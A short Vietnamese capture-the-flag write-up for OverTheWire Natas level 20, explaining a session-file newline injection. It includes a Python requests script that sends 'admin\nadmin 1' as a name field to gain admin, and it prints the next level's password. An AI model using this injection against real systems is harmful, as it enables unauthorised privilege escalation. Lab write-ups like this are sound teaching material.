# Natas 20 → 21

## Mục tiêu

Lấy password của `natas21` bằng cách ghi đè dữ liệu session.

## Tôi thấy

Source tự đọc session theo từng dòng dạng `key value`. Input `name` được ghi vào session nhưng không chặn newline. Có thể tạo thêm dòng `admin 1` trong session file.

## Cách làm

```python
import requests

s = requests.Session()
s.post(
    'http://natas20.natas.labs.overthewire.org/',
    auth=('natas20', '<password>'),
    data={'name': 'admin\nadmin 1'},
)
r = s.get(
    'http://natas20.natas.labs.overthewire.org/',
    auth=('natas20', '<password>'),
)
print(r.text)
```

Response xác nhận `You are an admin` và trả credentials cho level kế tiếp.

## Vì sao cách này hiệu quả

Parser session tách dữ liệu bằng newline rồi gán `admin = 1`. Request sau dùng cùng `PHPSESSID`, nên trạng thái admin được nạp lại.

## Kết quả

Password của `natas21`:

```text
7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```

